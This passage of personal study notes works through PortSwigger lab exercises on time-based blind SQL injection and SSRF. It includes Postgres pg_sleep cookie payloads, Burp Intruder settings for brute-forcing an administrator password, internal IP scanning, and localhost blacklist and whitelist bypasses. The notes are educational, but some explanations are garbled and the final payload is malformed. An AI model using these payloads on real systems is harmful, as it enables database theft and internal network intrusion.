-> The only thing we can try to see if the page is vulnerable to a blind SQL injection 

f) Discovering and exploiting blind sql injections will be different based on the database engine 
-> We can always rely on cheat sheets because they teach you how to execute different sql statements and exploit different sql injections based on the database engine 

g) In cheatsheet for sql injection, lets search for time , to get information on time based sql injection 

-> Here we get topic "Time Delays", it tells which query you should send to DB engine to cause time delay or make it sleep for a certain period of time 

h) Since we know that our web application uses Postgres DB, we will select the query for Postgres - SELECT pg_sleep(10)

1) We will send the request to Repeater 
2) Modify the request cookies -> TrackingId

Original value of TrackingId:
0uHDsxyyjWVUzvKC


3) Since it is postgres we will add two bars to append to the statement and before we inject we have to put a single quote to finish whatever statement that was present in the web application that was programmed by the programmer 

eg:TrackingId:
0uHDsxyyjWVUzvKC'||

4) Then tell the postgres db to sleep or wait for 10 seconds and then put two dashses to comment 

Exploit:26
eg:TrackingId:
0uHDsxyyjWVUzvKC'||pg_sleep(10)--


i) THus after this change in TrackingId, if the website waits for 10 seconds, then we can come to conclusion that we ae able to manipulate this website and execute SQL code 
-> if there is no delay and page loads with normal delay then we can undestand that the website is not vulnerable 

58)  Injection Vulnerabilities 3 - Time Based SQL Injection - Extracting Data From the Database Using a Time-Based SQL Injection 

a) From last lesson, we inferred that the target web application is vulnerable to a time based blind SQL injection 

b) All we have to do right now is to exploit this vulnerability to get the data we need 

c) We will do that by manipulating the time delay  

d) Similar to what we did in previous lessons:
-> We will ask web application with questions:
1) Do you have a table called users 
-> if it sleeps then it is true, else false 
2) Once we discover DB name or table name , we will guess the column name 
3) Once we know the column name, we will get usernmae/password 
4) difference from previous lesson: Previously we relied on page changes, But here the page does not change at all - hence we will rely on the time delays to tell us whether a certain table or certain user exists on db 

https://portswigger.net/web-security/sql-injection/cheat-sheet
e) In Cheatsheet we can see conditional time delays:

####
SELECT 
  CASE 
   WHEN(2=2) THEN 
    pg_sleep(10)
   ELSE
    pg_sleep(10)
	
  END
####

-> Here we do a select and we will use a case query 
   --> Inside case , if a certain condition is true , then sleep for 10 seconds 
   -> else dont sleep
   
-> By this we can confirm that the target web application is vulnerable to time based blind sql injection 

f) STEP 1: CONFIRMING THAT OUR SQL CODE GOT EXECUTED 

We need to put the below query in TrackingId

SQL Query: 
SELECT CASE WHEN (2=2) THEN pg_sleep(10) else pg_sleep(0) END 

eg:TrackingId:

Exploit:27 
0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) else pg_sleep(0) END )--


-> If we edit the value in TrackingId with this query and send it again in Repeater, then if it takes 10 time to load then it means that our SQL query got executed 
   -> 2=2 will always be true, hence we can be sure our code got executed if there is a delay 
   
g) STEP 2: CONFIRMING IF WE HAVE A TABLE CALLED USERS.
-> basically a sql query to check if table is present or not 

SQL QUERY: 
SELECT 
	CASE
		WHEN (2=2) 
			THEN 
			pg_sleep(10) 
			else 
			pg_sleep(0) 
	END 
FROM USERS 

Exploit:28 
0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) else pg_sleep(0) END FROM USERS  )--

g) STEP 3: CONFIRMING IF WE HAVE A TABLE CALLED USERS AND USERNAME='administrator'.


SQL QUERY: 
SELECT 
	CASE
		WHEN (username='administrator') 
			THEN 
			pg_sleep(10) 
			else 
			pg_sleep(0) 
	END 
FROM USERS 

Exploit:29 
0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) else pg_sleep(0) END FROM USERS  )--


h) STEP 3: CONFIRMING IF WE HAVE A TABLE CALLED USERS AND USERNAME='administrator' and checking if we have a PASSWORD 


SQL QUERY: 
SELECT 
	CASE
		WHEN (username='administrator' AND LENGTH(password)>1) 
			THEN 
			pg_sleep(10) 
			else 
			pg_sleep(0) 
	END 
FROM USERS 

Exploit:29 
0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (username='administrator'  AND LENGTH(password)>1) THEN pg_sleep(10) else pg_sleep(0) END FROM USERS  )--


i)STEP 4: CONFIRMING IF WE HAVE A TABLE CALLED USERS AND USERNAME='administrator' and checking if we have a PASSWORD  and arriving at length of the password 

-> Use a trial and error approach in length condition and arrive at the length of the password 



59)  Injection Vulnerabilities 3 - Time Based SQL Injection - Getting The Admin Password Using a Time-Based Blind SQL Injection 

j) Until now we know:
THERE IS A TABLE CALLED USER 
THERE IS A USER CALLED administrator
THERE IS A PASSWORD WHOSE length=20 


k) STEP 4: CONFIRMING IF WE HAVE A TABLE CALLED USERS AND USERNAME='administrator' and CHECKING IF THE FIRST CHARACTER OF THE PASSWORD IS "a" 

1)  Now the problem is, it is a 20 character length password and we cant get it displayed anywhere 
2)  We will follow the same approach which we followed in normal sql injection example :

3)  We are checking if the user name is administrator and checking if the first character of the password is "a" 

----> Substring syntax:
   SUBSTRING(password,indexPosition,length)
   
4) if it does not match go to each and every alphabet and see if it matches 

5) If it matches capture the letter and go to the next position by increasing the index 



SQL QUERY: 
SELECT 
	CASE
		WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') 
			THEN 
			pg_sleep(10) 
			else 
			pg_sleep(0) 
	END 
FROM USERS 


Exploit:30 
0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (username='administrator'  AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) else pg_sleep(0) END FROM USERS  )--



l) STEP 5: USING INTRUDER WITH CLUSTER BOMB TO RECOVER THE PASSWORD 

-> Sending request to intruder 
Intruder: Allows us to specify certain locations within the request where we can automatically change and send to the target web application and get our results straight away , instead of manually guessing every single character 

-> Using Sniper as attack type is slow, hence we will use attack type as "Cluster Bomb" 

1) In order to change, first thing we modify is the indexPosition part 

   SUBSTRING(password,indexPosition,length)
  
2) Second thing we will modify is the comparedCharacter  

 SUBSTRING(password,indexPosition,length)=comparedCharacter
 
 -> We will replace this with every single possible character that could be used in a password 
 
3) With regards to settings in intruder, like before 

We change: 
Positions -> Attack type -> Cluster Bomb 

First set: 
Payloads -> Payload Set -> 1
Payload type: Numbers 

Payload Options(numbers) 

Type: Sequential 
From: 1
To: 20 
Step: 1 

---> this will increase indexPosition from 1 to 20 


Second Set:
Payloads -> Payload Set -> 2
Payload type: Brute forcer 


Payload Options(Brute forcer )
Character Set: abcdefghijklmnopqrstuvwxyz0123456789
Min Length: 1
Max length: 1 

-> By this we are changing options for comparedCharacter 

4) As a result of configurations of set1/set2, payload count:36 and Request count will be 720  

->  Thus Burpsuite intruder takes care of taking of these 720 requests with payload count:36 

5) So far it has been the same to what we have done in normal SQL injection 
-> Main thing that is going to change for Time-based blind SQL injection is the RESOURCE POOL 
-> Resource pool is usally set to a default, which sends 10 concurrent requests at the same time, which is good in most scenarios 
-> But in our scenario, we actually want to monitor the amount of time taken for the response to get back to us [as it is a time based blind sql injection] , 
   Results will be much accurate, if we send only one request at a time 
   Obviously it will be slower, but results will more accurate 
6) So we need to create new resource pool with some name and give the following parameters :
  Maximum concurrent requests: 1 
  -> It means send only one request at a time and wait for the response , log the amount of time taken for that response - so that later on we can come back and 
	 analyze the results to find the correct characters 
7) Then click on start attack -> burp suite will execute the configuration that we set by increasing the index to the even single character of the 20 characters  
 that make up the password and then guess the value of that character - based on the brute force option that we set in set2  
 
  SUBSTRING(password,indexPosition,length)=comparedCharacter
  
8) Determining which is the correct guess based on the results displayed by intruder 
-> In previous example for sql injection, we went by the length as the page that was loading changed based on the injection or the payload that we are sending it 
-> So we looked at the length of the page and if it was of a certain length,  then we determined that it is the correct character 

9) But in this case(time based sql injection), we relied on the time taken for the respones to come back to us, to decide whether a certain guess is correct or 
   not 
-> Therefore we have to go to the columns , right click and enable: "Response received" and we will have a new column, which shows us the amount of time 
taken for the response to come back in milliseconds 
-> Now we are looking for 1000 or something above 

10) In results we can see Payload1 has value 19, and Payload2 has character "d" and Response Received is 10090,  which means that the 19th character of the password is "d" 

-> Similarly we can identify all the characters of the password based on the results show in intruder 

  
60) SSRF Vulnerabilities 4 - Introduction to SSRF vulberabilities:
a) SSRF   - Server side request forgery 
-> SSRF is no 10 in OWASP top 10 
-> SO it is the least common vulnerability that we are covering in our course 

61) SSRF Vulnerabilities 4 - Theory behind SSRF vulnerabilities and their impact. 
a) When you try to access a website, we communicate with a computer , that has a certain program called a web server 
-> web server can serve you files, images and so on 
-> It can also execute or interpret server side languages like PHP, python and so on. 

b) A lot of webservers do much more than simply serving you files and executing code 
-> A lot of time - they communicate with other servers and get the required information 
-> The other server they communicate may be a protected server that contains private information like user information 
-> Webserver communicates to the server(server1.com) using its domain name

c) Webserver can also communicate with server2(for getting shop related information) 

-> Webserver communicates to the server(server2.com) using its domain name
-) Webserver can also communicate to the server using its address 

d) These Servers(server1 and server2) could exist in a completely different location or they may be connected to the same network as this computer here . 


CLIENT --client request---> WEB SERVER --server request----server1.com----SERVER 1
												|
												|
												-----------------server2.com---SERVER 2
												
												
-> If client communicates with WEB server , it is called client request 
   And if web server communicates with other servers it is called server rquest
												
										
e) Earlier we saw CSRF vulberabilities where we manipulate the client request and get the client to submit request that they dont want to do 								
f) In SERVER SIDE REQUEST FORGERY - we manipulate the server and make the server submit requests, that it is not programmed to send 
-> As a result, it gives us useful information for hackers or pen testers 		

g) Now coming back to our example , where have a client communicating with webserver and the webserver in turn 	communicates with Server1, Server2 
	
h) In Server side request forgery scenario, as a hacker - you send forged request to the webserver, and as a result  you could get the webserver to submit rquests to a completely different server(server3)
-> Consequently if you are submitting anything malicious  to the server (server3). 

i) When analyzed it will look like webserver is trying to hack into server3 and not the client 
-> Hence if client hacks server3 or sends anything malicious to server3  - it will look like only webserver is hacking or doing something malicious  

j) if client tries to communicate with a protected server like Server1, the requests will be denied 
-> Client requests will be denied because SERVER1 can only communicate with WEBSERvER, since it would have a white list or black list 
-> Thus server1 communicates with Webserver because server1 trusts Webserver 

k) SO assuming that Web server is vulnerable to a SSRF, you will be able to send a forged request to this webserver  
-> And instead of simply asking server1.com, we will be asking for server1.com/private , which in this scenario  could get the private information about the user that the Server1 has like their passwords, phone numbers etc 
-> All this is possible because Server1 trusts the Webserver  

l) Another scenario of exploiting ssrf is, client can simply send a forged request to the server and cause it to send requests to itself , by bypassing security measurements and firewalls that this Webserver has. 
-> Because we are simply sending these requests from the server itself and overloading it by requests that are originating from the same server 


m) Another scenario: you could even send forged requests from client to this webserver to discover the internal network and possibly even discover the open ports or running services on these ports 
-> From there we can discover vulnerabilities that these services might have and even gain full control or do code execution on the server or one of the clients that are connected to the same network . 

n) Hence impact of ssrf could be minor or devastating depending on the web application in webserver and what you can do with the exact vulberability


62) SSRF Vulnerabilities 4 - Discovering a basic SSRF vulnerability 

Target website: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost 

a) As first step of finding any vulnerability, Follow usual steps: 
-> Click on every link 
-> Analyze normal behaviour of website and make a list 
-> Map the website 
-> Test every single possible value that is being sent to the website 


b) In our example since we know where the vulnerability is , we will simply click on view details on a product 

-> check stock feature in view details screen is vulnerable to a SSRF attack
-> lets first check how the functionality works by clicking on "london" which checks if this item is in stock  
-> As a result you wll get the number of items that are available in stock 

c) Turn on Burpsuite -> Intercept on -> send request for Check stock 

-> Lets analyse the data that is sent to webserver,upon clicking the "Check stock" 

eg:
Request: 
POST /product/stock HTTP/2
Host: 0a26004c0400d58a83c6d2aa0018007a.web-security-academy.net
Cookie: session=CNFx0URQjorgQVdgf9U4QAyUcNn1bEdK
Content-Length: 107
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a26004c0400d58a83c6d2aa0018007a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a26004c0400d58a83c6d2aa0018007a.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1


--> In this request, lets focus on stockApi which has value :
http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
-> On further decoding using notepad++ url decoding or decoding using burpsuite decoder we get this url:http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1

d) When we click on check stock in this web site, the webserver that runs this website is sending another http request(Server side request) to the webserver that is running on 
following address: http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1 and it asks for the product for the stock with the given 
product id and store id 

e) As a client we will be able to modify this url to whatever url we want , and if we are able to manipulate this url and submit requests to any other server - then you have discovered as server side request forgery.

-> Because you are able to tamper with the server side request that this webserver is trying to make and you are making it do something else that is not designed to 
do 
-> to test it, lets try to load localhost , by changing url in stock api 


stockApi=http%3a//localhost/


-> This loads its own page 


f) THus we are able to send a forge request to the webserver and return the page after csrf attack 


63) SSRF Vulnerabilities 4 - Accessing Private (Admin) Resources Using an SSRF vulnerability

a) In the example which we used in the previous lesson, we are able to see the page loading at the bottom 
b) The difference we can see in the local page downloaded is that we are able to see the admin panel link
-> if we click on admin panel link, we will get an error:
"Admin interface only available if logged in as an administrator or if requested from loopback"

c) In general , if you clicked on a link and it did not load and you were able to discover it using "Server side request forgery vulberability, - then it is worth giving a  shot to get the server to submit that link on your behalf 

d) Basically exploit the ssrf again to load, whatever link you want 

e) Because similar to what we saw earlier, if we have a server , similar to Server 1 which contains Private data  - it might actually refuse direct connections to it from the client

f) But what we can do is, since we know that this server is vulnerable to ssrf , we can send request from client to webserver and send that request to server1  and make the webserver to submit it to server1 on our behalf 
-> Since server1, trusts this server - data will be loaded from server1 to webserver and client will be able to see the server1 data - because we are exploiting a ssrf 

g) Now to practical: turn on interceptor 
-> in same lab we will alter stock api to send request to local host 
-> Now we will be able to see the admin panel
-> lets copy its link and submit another request to stock check her 
-> in interceptor -> stock api replace the admin url here for stockApi 

stockApi=https://0aa400ea04f0337280eb445000dc000a.web-security-academy.net/admin

or
http://localhost/admin


-> Now we managed to load the admin page without having to login 
-> Because whats happening is: webserver is by itself loading the admin page, since it has ssrf vulberability


-> Now we can go ahead and try deleting the user  

h) Now if you want to delete , you can delete from browser or client. so you need to copy it and paste in stock api, so that webserver submits the request to itself and from burpsuite we will be able to perform delete operation

-> Thus we are able to do things from burpsuite since we do things from webserver and exposed to ssrf vulberability



63) SSRF Vulnerabilities 4 - Advanced SSRF Discovery

a) In this lesson, we will use the intruder feature of Burp suite 
-> to discover the clients that are connected to the same network as the webserver hosting the vulnerable web application 
-> And the services running in these clients 

Target website: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

b) In target lab, we have another shop website, Follow the general steps of penetration testing/hacking 
-> Test every single functionality 


c) We know that the stock checking functionality is vulnerable here also, similar to the previous example 
d) On doing "Check stock" we will see the interceptor in proxy of Burp suite capturing the request  and in that what we are interested is this:

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

-> Stock api we are specifying the url to which it needs to reach to get the stock count  

url decoded:
stockApi=http://192.168.0.1:8080/product/stock/check?productId=2&storeId=1

d) Since url is different, we can conclude:
1)  that it is server side request
2)  and if users ae able to modify this request in any way means we are able to forge the request 
3) and if users able to send the request on behalf of this web server: https://0ad8006204302e3d8091626100c900a9.web-security-academy.net/ to the other web server : http://192.168.0.1:8080/product/stock/check?productId=2&storeId=1

-> then it means  we have discovered a server side request forgery vulnerability and we are able to exploit it 

e) In the previous example, we changed the url in stockApi to localhost to load whatever web server on the current server - that has web application installed on it 
-> But in this example if you look at the url, you will notice that this is an internal ip , that can be used only in internal networks 

http://192.168.0.1:8080/product/stock/check?productId=2&storeId=1

-> So if you lookup internal ips, you will see number of examples , one of them is 192.168.0.1
-> 8080 is the port to whcih request is being sent to  
-> if you dont specify the ports like previous example, then data will be sent to default port 80 which is for http 

f) VERIFYING THAT THIS WEBSITE IS VULNERABLE TO SERVER SIDE REQUEST FORGERY 
-> lets first verify that this website has server side request forgery vulberability and then if we managed to discover the vulberability - we can see how we can modify this request to discover all the client connected to the same network 

1) To verify that this website is vulnerable, we need to modify the request and see if the request gets submitted , we can send this request to repeater and set stock api with basic url 

stockApi=http://192.168.0.1:8080/

and send the request we get below response:

HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
X-Frame-Options: SAMEORIGIN
Content-Length: 19

"Missing parameter"

2) This means that we have a server side request forgery vulnerability in the website 
-> From there we can see the impact and see what we can do with it 
---> Bottom line is - we are able to modify the request and have the server submitter on our behalf 
-> Also from the response, we can see that when we send this request - we actually got a http response with error

3) Since 192.168.0.1 is internal ip, lets change it to 2:

stockApi=http://192.168.0.2:8080/


Response:
##
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 2350

<!DOCTYPE html>
																													<html>
																														<head>
																															<link href=resources/labheader/css/academyLabHeader.css rel=stylesheet>
																															<link href=resources/css/labs.css rel=stylesheet>
																															<title>Basic SSRF against another back-end system</title>
																														</head>
																														<script src="/resources/labheader/js/labHeader.js"/>
																														<div id="academyLabHeader">
																															<section class='academyLabBanner'>
																																<div class=container>
																																<div class=logo></div>
																																<div class=title-container>
																																<h2>Basic SSRF against another back-end system</h2>
																																<a id='lab-link' class='button' href='/'>Back to lab home</a>
																																<a class=link-back href='https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
																																	<g>
																																		<polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'/>
																																		<polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'/>
																																	</g>
																																</svg>
																															</a>
																														</div>
																														<div class='widgetcontainer-lab-status is-notsolved'>
																															<span>LAB</span>
																															<p>Not solved</p>
																															<span class=lab-status-icon></span>
																														</div>
																													</div>
																												</div>
																											</section>
																										</div>
																										<div theme="">
																											<section class="maincontainer">
																												<div class="container is-page">
																													<header class="navigation-header">
                    </header>
																													<h4>Internal Server Error</h4>
																													<p class=is-warning>Could not connect to external stock check service< p>
																												</div>
																											</section>
																										</div>
																									</body>
																								</html>


####

4) Now when we send the request in the repeater, the response that we see is a 500 internal error.
-> If we see in the renderer, we can see "Could not connect to external stock check service" 
-> It means that we are not able to connect to 192.168.0.2 which means that no service is running on ip: 192.168.0.2 on port 8080 


5) But when we ran it with 192.168.0.1 it gave response as missing parameter , 

6) Thus by simply modifying the octet in ip and increasing it from 1 to 254 , we will be able to discover all of the internal IPs , so all of the internal computers connected to the same network as the server hosting the vulnerable application 
-> Also we can change ports to identify the service 


g) All these tasks mentioned above can be done with the help fo Burpsuite intruder 


64) SSRF Vulnerabilities 4 - Scanning and Mapping Internal network and services 

a) By simply sending requests to every possible IP, by increasing the last octet(X) in ip, we will be able to discover all the live clients in the network 

10.0.2.X:Y 

b) We can also change the Y value to discover the ports running on these clients 

c) Changing ports and ip can be done automatically using intruder 

d) First we can send the request to intruder
e) Clear the $ signs in intruder, so that we can tell the intruder what to modify in each request it sends  
-> What we want to modify is the X in the IP: 10.0.2.X:Y  
-> We specify the IP in stockAPI value 

f) We modify X to discover all the computers that are stored in the same network as the server hosting the vulnerable application. 

-> to do that in the value: stockApi=http://192.168.0.1:8080/
-> I will click 1 here and highlight and then click add $ , which gets transformed to:

stockApi=http://192.168.0.§1§:8080/

g) We are keeping Y, i.e 8080 in our case as it is - so that  we ae actually going to discover the devices in the same network that ports 8080 open 

-> if you want to cover other ports we need to highlight 8080 and add the $ sign again 
-> And then use the cluster bomb attack 


h) In our case we are going to change only Ip, we will use sniper attack 

i) then go to payloads, 
In Payload sets -> Payload set: 1  as we use sniper 
				   Payload Type: Numbers , because Ips consist of only numbers
				   
				   
				   
j) Payload Options[Numbers]
Type: Sequential 
From: 1
To: 254 [max range of ip excluding broadcast] 
Step : 1 [so that we increase by 1 and send request to every possible Ip in this range] 

k) If we dont get valid response, then it means that we dont have a device that is connected to the network that is running on that port 
-> If we get a valid response , then we have discovered a device which we can go ahead an browse it 



l) Once we fill above details, we can see In Payload sets, Payload Count is set to 254 and Request count is set to 254 

m) Also ensure that the url in stockAPI is encoded by doing CTRL+U 
-> Then we can click: Start Attack

n) Since sniper attacks will be slow one by one 

and if we  see for ip: 192.168.0.1 
-> Response is 1 and we get "Missing parameter" in the response 


0) Even if we have 400,404 we can understand that this ip is active and we can try to send requests in those ips

p) From intruder we can try sending requests by using repeater
-> Select the particular request , right click and send to Repeater 
-> set the Ip and send the request, if 8080 does not work, try to find ports by using intruder or send requests in repeater using 
   arbitrary port numbers 
   
q) Assume we got ip: 192.168.0.167 with 404 response 

 lets try with stockApi in the repeater using this url, then we will be able to reach to admin page[not sure it will happen all time] 
 
 stockApi=http%3a//192.168.0.167%3a8080/admin
 
 r) EXPLOITING: Now if we want to exploit this page, 
 1) Right click the link you want to run, copy the link address for the admin and send it as a forged request from repeater , with stockApi having the copied url 
 2) Thus by doing this, client does not contact the server directly and instead, vulnerable web server contacts the SERVER 1 , based on trust between SERVER 1 and VULNERABLE SERVER 
 
 3) If i want to delete, i should copy this url and put in stockAPI
 http://192.168.0.254:8080/admin/delete?username=wiener
 
 4) Running with this value in repeater,will delete user wiener and after that if we launch http%3a//192.168.0.254%3a8080/admin, we wont be able to see user wiener in the admin page 
 
 
 CLIENT -> VULNERABLE WEB SERVER -> SERVER 1 
 
 
65) SSRF Vulnerabilities 4 - Bypassing blacklists 

-> In this lesson, we will be looking on bypassing security, whether it is blacklist or whitelist 
-> Programmers will implement certain features thinking that they can prevent these kind of vulnerabilities.
-> In this lesson, we will how some of these features can be bypassed

Target Website: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

a) We have our target website which gives us the product details , we have the stock checker which we are going to exploit 
-> We already know that this, stock checker functionality has a ssrf vulnerability
b) The goal is bypass the security that this particular website has implemented 
c) We will turn on our interceptor and check the feature for "stock checker"
-> Like last lesson, we  have the stockApi being sent in RequestBodyParameters. Here the stockApi parameter is vulnerable 

d) Now we will right click and send the request to repeater 
-> In repeater lets first send the normal request and see if we get the normal response:

Request: 
POST /product/stock HTTP/2
Host: 0acb00930462ef4a82643d9800da002f.web-security-academy.net
Cookie: session=rxXAKJrP9cTSieYGoTsg6qY7BrBUI5jI
Content-Length: 107
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0acb00930462ef4a82643d9800da002f.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0acb00930462ef4a82643d9800da002f.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1


Response:
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2

84

---> Thus we got a normal request/response 


e) In last lesson, we chnaged  stockApi url and see that we are able to access the resources that are not visible on the page like "Admin" details  . Also we are able to perform some admin operations in that lesson by just changing stockApi 

f) But now if we change the stock api to localhost in this lab lesson, we get an error in the response 

eg:
stockApi=http://localhost/

Response:
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 51

"External stock check blocked for security reasons"

d) In order to prevent this vulnerability, developer must have used a black list which is throwing this error 

How black list works?

Client --WebServer---> Is request in black list -->if no-->  Request sent to Server 
                                            |
											|
											-------If YES --->  Error will be thrown 



e) Here blacklist is a simple file that contains number of words like admin, localhost,administrator, +, " etc 
-> if statement checks if your request contains any of these words and then it will block it 
-> developers can include any number of words in the black list 

f) Since black list contains the words that should be blocked, if you manage to ask for what you want in a different way  - then you will be able to bypass this black list 

g) Different ways of writing localhost

localhost  ----  lOcaLHost [Simply write with capital letters]
				 127.0.0.1 [Using ip of local host ie Reserved IP to refer localhost ] 
				 127.1  [In IPs if we remove zeroes we can still go to the same location]
				 017700000001[Octal representation of IP] 
				 0x7f000001[hex representation of IP ]
				 2130706433[Integer representation of IP]


h) Now if we change the stockApi: to any of these forms of localhost, we will be able to get appropriate response 

eg:
stockApi=http://lOcaLHost/  
stockApi=http://127.1/ 

Response:
Admin panel gets displayed in the renderer 

-> Since the modified form of localhost is not in the blacklist, we are able to bypass the security implemented 

i) Double encoding is one way of bypassing security against blacklist 

j) Another way of bypassing is, register a domain name and get it resolved to localhost 

eg: zaidh.com to 127.0.0.1 



65) SSRF Vulnerabilities 5 - Bypassing Whitelists 
a) In last lesson we saw how to bypass blacklist which programmers have implemented against ssrf vulnerability, lets look into a more difficult and challenging way to bypass which is - If the target website uses white lists 
 
 
Target Website: https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

b) In target lab, we have a website which is very similar to the previous websites we saw . 

-> Here also clicking on a product and checking the stock, gives the amount of units 
-> Similar to last lesson, stockAPI is being sent in the request 


eg:
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1


c) Now if we change it to 
stockApi=http://localhost/

we get response as:
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 58

"External stock check host must be stock.weliketoshop.net"


d) lets assume that blacklist is used to implement security 

-> lets try all blacklist options to bypass security 
stockApi=http://locaLhOst/

-> But still we get hte same response:
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 58

"External stock check host must be stock.weliketoshop.net"


e) Hence we could come to a conclusion that the target website uses whitelist to protect the website 

What is Whitelist:
While blacklist contains list of words that request should not contain, whitelst contain list of words that request should contain 

f) Our error message says that request should be sent to:

stock.weliketoshop.net

-> Therefore we need to send a request to: stock.weliketoshop.net, but at the same time we have to send the request somewhere else 

g) Basically we need to send a request that contains this domain : in order to fool the server into thinking that we are trying to access this domain and get it to do what we want and send the request to somewhere else 


h) So just to check we assigned stockApi with the domain and lets see the response 

eg:
stockApi=http://stock.weliketoshop.net/

Response:
We still get an internal server error but we dont get any error like the previous one, where we cant send the request at all. 


i) Solution:
-> We can authenticate ourslef while loading a url 

-> you can authenticate by saying: 

stockApi=http://zaid@stock.weliketoshop.net/

j) By doing so, we are trying to login to the serverice using this username@syntax 

stockApi=http://zaid@stock.weliketoshop.net/

-> If we send this request in repeater, again we will notice that we  get internal server error, but like previous example not complaining about the request 

URI reference: https://www.rfc-editor.org/rfc/rfc3986.txt


k) If we go ahead and read, how this url can be formatted, we have an RFC standard there :

RFC Standard on URI:
1) It explains that user information may consist of user name followed by @ , which delimits it from the host 

-> It explains that you can have a username before the url , before the @sign 


############
Scheme:
-> Each URI begins with a scheme name that refers to a specification for assigning identifiers within that scheme.
-> Scheme names consist of a sequence of characters beginning with a letter and followed by any combination of letters, digits, plus("+"), period ("."), or hyphen ("-").


  scheme      = ALPHA *( ALPHA / DIGIT / "+" / "-" / "." ) 

..........................

Authority:
-> Many URI schemes include a hierarchical element for a naming authority so that governance of the name space defined by the remainder of the URI is delegated to that authority (which may, in turn, delegate it further).  The generic syntax provides a common means for distinguishing an authority based on a registered name or
server address, along with optional port and user information.

-> The authority component is preceded by a double slash ("//") and is terminated by the next slash ("/"), question mark ("?"), or number sign ("#") character, or by the end of the URI.

####################



2) It also says, Optionally you can have a scheme specific information  about how to gain authorization to access the resource 
-> In rfc it tells how a scheme should be and how it should be formatted
-> In authority section, it tells you that : when URI schemes include hierarchial elements for naming authority 
-> How it works is you have: doubleslash("//") followed by string and terminated by slash("/") , question mark("?") or number sign ("#")  


3) hence if you think of it: When you usually have url  :

https://www.rfc-editor.org/rfc/rfc3986.txt


--> you have https and then the colon( which we can forget for now)

-> Then you have double slash("//") 
-> then you have something 
-> Then you have forward slash 


4) Everytime you have a forward slash , that is an authority , that is a scheme 

5) We can try to explot this to our advantage  and hopefully the parser will understand that as a separate url - based on information specified in rfc 



m) Here in the url, instead of zaid we will use localhost 


stockapi=http://localhost@stock.weliketoshop.com

n) This rfc standard on uri-> authority says that i can have a  pound , forward slash or question mark to format it in a way or to tell the parser that this is a full url 
-> so after that(localhost) i can either have a forward slash or question mark or pound sign 
-> In our url we have added a #


stockapi=http://localhost#@stock.weliketoshop.com

o) Now when the parser reads this, it will read that as its own url and then whatever filtering (whitelist) implemented by programmer will not be triggered because we will have stock.weliketoshop.net in the url

p) Now lets send that and see if it is gonna work  



eg:
Exploit:31
stockApi=http://localhost#@stock.weliketoshop.com


Response:
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 58

"External stock check host must be stock.weliketoshop.net"


